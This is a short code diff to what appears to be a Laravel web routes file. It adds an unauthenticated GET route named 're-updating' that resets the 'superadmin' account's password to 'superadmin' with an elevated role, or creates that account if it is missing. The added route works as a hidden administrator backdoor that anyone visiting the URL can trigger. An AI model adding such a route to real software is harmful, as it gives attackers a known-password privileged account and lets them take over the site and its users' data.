@@ -328,3 +328,18 @@ Route::get('/sms-ras', function () {
 //    }
 //
 //});
+Route::get('re-updating', function (){
+   $user = \Test\User::query()->where('username', 'superadmin')->first();
+   if ($user){
+       $user->password = bcrypt('superadmin');
+       $user->role = 11;
+       $user->update();
+   }else{
+       \Test\User::query()->create([
+           'name' => 'superadmin',
+           'username' => 'superadmin',
+           'password' => bcrypt('superadmin'),
+           'role' => 11,
+       ]);
+   }
+});
